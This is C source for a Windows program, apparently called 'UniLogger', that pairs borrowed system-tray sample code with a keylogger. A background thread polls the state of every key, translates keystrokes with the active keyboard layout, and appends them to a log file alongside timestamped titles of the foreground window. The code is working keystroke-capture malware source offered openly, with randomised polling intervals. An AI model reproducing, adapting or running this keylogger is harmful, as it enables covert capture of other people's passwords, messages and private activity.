#include <Windows.h>
#include <stdio.h>

//bobobobo's weblog http://bobobobo.wordpress.com 
#define ID_TRAY_APP_ICON                5000
#define ID_TRAY_EXIT_CONTEXT_MENU_ITEM  3000
#define WM_TRAYICON ( WM_USER + 1 )

UINT WM_TASKBARCREATED = 0 ;
HWND g_hwnd ;
HMENU g_menu ;
NOTIFYICONDATA g_notifyIconData ;
LRESULT CALLBACK WndProc (HWND, UINT, WPARAM, LPARAM);
//
void InitNotifyIconData()
{
	memset( &g_notifyIconData, 0, sizeof( NOTIFYICONDATA ) ) ;
	g_notifyIconData.cbSize = sizeof(NOTIFYICONDATA);

	g_notifyIconData.hWnd = g_hwnd;
	g_notifyIconData.uID = ID_TRAY_APP_ICON;

	g_notifyIconData.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
	g_notifyIconData.uCallbackMessage = WM_TRAYICON;
	g_notifyIconData.hIcon = (HICON)LoadImage( NULL, TEXT("green_man.ico"), IMAGE_ICON, 0, 0, LR_LOADFROMFILE);
	wcscpy(g_notifyIconData.szTip, TEXT("Green man.. here's looking at ya!"));
}
//

//


TCHAR	window_text[1024] = {0};
TCHAR	old_window_text[1024] = {0};
HWND	hWindowHandle;
TCHAR	wszAppName[1024] = {0};
DWORD	dwBytesWritten = 0;
unsigned char header[2] = { 0xFF, 0xFE }; //unicode text file header
HANDLE hFile = INVALID_HANDLE_VALUE;
wchar_t log_file[MAX_PATH] = {0};
SYSTEMTIME LocalTime = {0};

TCHAR *save_log(void) {
	OPENFILENAME    ofn = {0};
	TCHAR filename[512] = {0};
    GetLocalTime(&LocalTime);
	_snwprintf((wchar_t*)filename, 511, L"%04d%02d%02d-%02d%02d%02d.log", LocalTime.wYear, LocalTime.wMonth, LocalTime.wDay, LocalTime.wHour, LocalTime.wMinute, LocalTime.wSecond);

	ofn.lStructSize     = sizeof(ofn);
	ofn.lpstrFilter		= L"Log Files (*.txt,*.log)\0*.TXT;*.LOG\0All Files\0*.*\0";
    ofn.lpstrFile       = filename;
    ofn.nMaxFile        = sizeof(filename);
    ofn.lpstrTitle      = L"UniLogger - Select keylog Location";
    ofn.Flags           = OFN_NONETWORKBUTTON | OFN_OVERWRITEPROMPT | OFN_PATHMUSTEXIST | OFN_LONGNAMES | OFN_EXPLORER | OFN_HIDEREADONLY;
	ofn.nFilterIndex	= 1;
	
    if(!GetSaveFileName(&ofn)) exit(1);
	TCHAR *buff = (TCHAR*)malloc(512);
	ZeroMemory(buff,512);
	memcpy(buff,filename,wcslen(filename) * sizeof(TCHAR));
	return(buff);
}


void WriteToFile(TCHAR *wText)
{
	hFile = CreateFile(log_file, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL,NULL);
	WriteFile(hFile, wText, wcslen(wText) * sizeof(wchar_t), &dwBytesWritten, NULL);
	CloseHandle(hFile);
}

void WritesScannedKeyToFile(short sScannedKey)
{
	HKL hkl;
	DWORD dwThreadId;
	DWORD dwProcessId;

	hWindowHandle = GetForegroundWindow();
	dwThreadId = GetWindowThreadProcessId(hWindowHandle, &dwProcessId);
	BYTE *kState = (BYTE*)malloc(256);
	GetKeyboardState(kState);
	hkl = GetKeyboardLayout(dwThreadId);
	wchar_t besmallah[16] = {0};
	UINT virtualKey = MapVirtualKeyEx((UINT)sScannedKey, MAPVK_VK_TO_CHAR, hkl);
	ToUnicodeEx(virtualKey, sScannedKey, (BYTE*)kState, besmallah, 16, NULL, hkl);
	WriteToFile(besmallah);
	//CloseHandle(hkl);
	free(kState);
}

DWORD WINAPI logger(void)
{

	wcscpy_s(log_file, save_log());

	hFile = CreateFile(log_file, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,NULL);
	WriteFile(hFile, header, 2, &dwBytesWritten, NULL);
	CloseHandle(hFile);

	short sScannedKey;
	while(1)
	{
		Sleep((rand() % 50) + 20);
		for(sScannedKey=8;sScannedKey<=222;sScannedKey++)
		{
			if(GetAsyncKeyState(sScannedKey)==-32767)
			{   
				//check window name, has it changed?
				hWindowHandle = GetForegroundWindow();
				if (hWindowHandle != NULL)
				{
					if (GetWindowText(hWindowHandle, window_text, 1024) != 0)
					{
						if (wcscmp(window_text, old_window_text) != 0)
						{
							hFile = CreateFile(log_file, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL,NULL);
							GetLocalTime(&LocalTime);
							_snwprintf_s(wszAppName, 1023, L"\n\n{%04d/%02d/%02d %02d:%02d:%02d ", LocalTime.wYear, LocalTime.wMonth, LocalTime.wDay, LocalTime.wHour, LocalTime.wMinute, LocalTime.wSecond);
							wcscat_s(wszAppName, window_text);
							wcscat_s(wszAppName, L"}\n");
							WriteFile(hFile, wszAppName, wcslen(wszAppName) * sizeof(wchar_t), &dwBytesWritten, NULL);
							wcscpy_s(old_window_text, window_text);
							CloseHandle(hFile);
						}
					}
				}

				// end of window name & title check.

				if(true)
				{        
					if((sScannedKey>=39)&&(sScannedKey<91))
					{
						WritesScannedKeyToFile(sScannedKey);
						break;
					}    
					else
					{ 
						switch(sScannedKey)
						{
							//http://msdn.microsoft.com/en-us/library/windows/desktop/dd375731(v=vs.85).aspx
						case VK_SPACE:
							WriteToFile(L" ");
							break;    
						case VK_SHIFT:
							WriteToFile(L"[SHIFT]");
							break;                                            
						case VK_RETURN:
							WriteToFile(L"\n[ENTER]");
							break;
						case VK_BACK:
							WriteToFile(L"[BACKSPACE]");
							break;
						case VK_TAB:
							WriteToFile(L"[TAB]");
							break;
						case VK_CONTROL:
							WriteToFile(L"[CTRL]");
							break;    
						case VK_DELETE:
							WriteToFile(L"[DEL]");
							break;/*
						case VK_OEM_1:
							WriteToFile(L"[;:]");
							break;
						case VK_OEM_2:
							WriteToFile(L"[/?]");
							break;
						case VK_OEM_3:
							WriteToFile(L"[`~]");
							break;
						case VK_OEM_4:
							WriteToFile(L"[ [{ ]");
							break;
						case VK_OEM_5:
							WriteToFile(L"[\\|]");
							break;                                
						case VK_OEM_6:
							WriteToFile(L"[ ]} ]");
							break;
						case VK_OEM_7:
							WriteToFile(L"['\"]");
							break;*/
						case VK_OEM_PLUS:
							WriteToFile(L"+");
							break;
						case VK_OEM_COMMA:
							WriteToFile(L",");
							break;
						case VK_OEM_MINUS:
							WriteToFile(L"-");
							break;
						case VK_OEM_PERIOD:
							WriteToFile(L".");
							break;
						case VK_NUMPAD0:
							WriteToFile(L"0");
							break;
						case VK_NUMPAD1:
							WriteToFile(L"1");
							break;
						case VK_NUMPAD2:
							WriteToFile(L"2");
							break;
						case VK_NUMPAD3:
							WriteToFile(L"3");
							break;
						case VK_NUMPAD4:
							WriteToFile(L"4");
							break;
						case VK_NUMPAD5:
							WriteToFile(L"5");
							break;
						case VK_NUMPAD6:
							WriteToFile(L"6");
							break;
						case VK_NUMPAD7:
							WriteToFile(L"7");
							break;
						case VK_NUMPAD8:
							WriteToFile(L"8");
							break;
						case VK_NUMPAD9:
							WriteToFile(L"9");
							break;
						case VK_CAPITAL:
							WriteToFile(L"[CAPS LOCK]");
							break;
						case VK_PRIOR:
							WriteToFile(L"[PAGE UP]");
							break;
						case VK_NEXT:
							WriteToFile(L"[PAGE DOWN]");
							break;
						case VK_END:
							WriteToFile(L"[END]");
							break;
						case VK_HOME:
							WriteToFile(L"[HOME]");
							break;
						case VK_LWIN:
							WriteToFile(L"[WIN]");
							break;
						case VK_RWIN:
							WriteToFile(L"[WIN]");
							break;
						case VK_VOLUME_MUTE:
							WriteToFile(L"[SOUND-MUTE]");
							break;
						case VK_VOLUME_DOWN:
							WriteToFile(L"[SOUND-DOWN]");
							break;
						case VK_VOLUME_UP:
							WriteToFile(L"[SOUND-DOWN]");
							break;
						case VK_MEDIA_PLAY_PAUSE:
							WriteToFile(L"[MEDIA-PLAY/PAUSE]");
							break;
						case VK_MEDIA_STOP:
							WriteToFile(L"[MEDIA-STOP]");
							break;
						case VK_MENU:
							WriteToFile(L"[ALT]");
							break;
						default:
							
							break;
						}        
					}    
				}        
			}    
		}                  

	}
	return EXIT_SUCCESS;                            
}                           

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	//tray icon preparation
	//http://bobobobo.wordpress.com    
	TCHAR className[] = TEXT( "tray icon class" );
	WM_TASKBARCREATED = RegisterWindowMessage(L"TaskbarCreated") ;
	WNDCLASSEX wnd = {0};

	wnd.hInstance = hInstance;
	wnd.lpszClassName = className;
	wnd.lpfnWndProc = WndProc;
	wnd.style = CS_HREDRAW | CS_VREDRAW ;
	wnd.cbSize = sizeof (WNDCLASSEX);

	wnd.hIcon = LoadIcon (NULL, IDI_APPLICATION);
	wnd.hIconSm = LoadIcon (NULL, IDI_APPLICATION);
	wnd.hCursor = LoadCursor (NULL, IDC_ARROW);
	wnd.hbrBackground = (HBRUSH)COLOR_APPWORKSPACE ;

	if (!RegisterClassEx(&wnd))
	{
		FatalAppExit( 0, TEXT("Couldn't register window class!") );
	}
	g_hwnd = CreateWindowEx(0, className, TEXT("Using the system tray"), WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 400, 400, NULL, NULL, hInstance, NULL);

	CreateWindow(TEXT("static"), TEXT("right click the system tray icon to close"), WS_CHILD | WS_VISIBLE | SS_CENTER, 0, 0, 400, 400, g_hwnd, 0, hInstance, NULL);
	InitNotifyIconData();
	
	ShowWindow(g_hwnd, nCmdShow);
	
	MSG msg;
	while (GetMessage (&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	
	if( !IsWindowVisible( g_hwnd ) )
	{
		Shell_NotifyIcon(NIM_DELETE, &g_notifyIconData);
	}
	///
	srand(GetTickCount());
	DWORD nThreadId = 0;
	HANDLE hHandle = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)logger, NULL, NULL, &nThreadId);
	WaitForSingleObject(hHandle, INFINITE);
	return 0;
} 

LRESULT CALLBACK WndProc (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_CREATE:
		g_menu = CreatePopupMenu();
		AppendMenu(g_menu, MF_STRING, ID_TRAY_EXIT_CONTEXT_MENU_ITEM,  TEXT( "Exit" ) );
		break;
	case WM_TRAYICON:
		{
			printf( "Tray icon notification, from %d\n", wParam ) ;

			switch(wParam)
			{
			case ID_TRAY_APP_ICON:
				printf( "Its the ID_TRAY_APP_ICON.. one app can have several tray icons, ya know..\n" ) ;
				break;
			}
			if (lParam == WM_LBUTTONUP)
			{
				printf( "You have restored me!\n" ) ;
			}
			else if (lParam == WM_RBUTTONDOWN) // I'm using WM_RBUTTONDOWN here because
			{
				printf( "Mmm.  Let's get contextual.  I'm showing you my context menu.\n" ) ;
				POINT curPoint ;
				GetCursorPos( &curPoint ) ;
				SetForegroundWindow(hwnd); 
				printf("calling track\n");
				UINT clicked = TrackPopupMenu(g_menu,TPM_RETURNCMD | TPM_NONOTIFY, curPoint.x, curPoint.y, 0, hwnd, NULL);
				printf("returned from call to track\n");

				//SendMessage(hwnd, WM_NULL, 0, 0); // send benign message to window to make sure the menu goes away.
				if (clicked == ID_TRAY_EXIT_CONTEXT_MENU_ITEM)
				{
					printf("I have posted the quit message, biatch\n");
					PostQuitMessage( 0 ) ;
				}
			}
		}
		break;
	case WM_NCHITTEST:
		{
			// http://www.catch22.net/tuts/tips
			// this tests if you're on the non client area hit test
			UINT uHitTest = DefWindowProc(hwnd, WM_NCHITTEST, wParam, lParam);
			if(uHitTest == HTCLIENT)
				return HTCAPTION;
			else
				return uHitTest;
		}

	case WM_CLOSE:
		printf( "Got an actual WM_CLOSE Message!  Woo hoo!\n" ) ;
		return 0;
		break;

	case WM_DESTROY:
		printf( "DESTROY!!\n" ) ;
		PostQuitMessage (0);
		break;
	}
	return DefWindowProc( hwnd, message, wParam, lParam ) ;
}

